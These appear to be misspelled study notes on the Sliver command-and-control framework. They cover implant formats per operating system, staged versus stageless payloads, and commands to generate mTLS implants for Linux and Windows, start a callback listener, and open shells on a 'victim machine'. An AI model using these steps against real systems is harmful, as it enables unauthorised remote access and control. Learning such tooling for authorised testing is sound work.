### DIfferne t Implants for Diff OS

**WIndows**
- EXE
- DLL
- x64
- x32
**Linux**
- ELF
**MACos**
- Mach-O Executable

**Staged and Stageless Paylaod**

### 
<h3>Staged</h3>
- Small & stelthy
- 2nd Download Required

<h3>stageless</h3>
- Largge and can be detected
- no seeocnd donwlaod required it has the full code

### Implant Generatiion in Linux

```
generate --mtls lhost:lport --os linux --save /home/antivenom 
```
`mtls implant creation`

```
mtls -L lhost -l lport # this will create an Job
```
`Setting up the mtls listener`

![](../../attchments/Pasted%20image%2020260719152716.png)

```
jobs 
```
`To see all the jobs`

![](../../attchments/Pasted%20image%2020260719152827.png)
After the Implant Execution you can see the session in the sliver

```
session -i 6b530f18 
```
`This will help you execute commands on the vitim machine`

### Implant creation on Windows

```
generate --mtls lhost:lport --os windows --save /home/antivenom 
```
`Winodws Implant Generation mtls`

```
jobs -K
```
`This will kill all the sessions`

```
mtls -L lhost -l lport # this will create an Job
```
`Setting up the mtls listener`

```
sessions
```
`THis will show all the Alive sessions`

```
sessions -i id
```

```
shell
```

**Ctrl+D to get back to the session form  an shell**

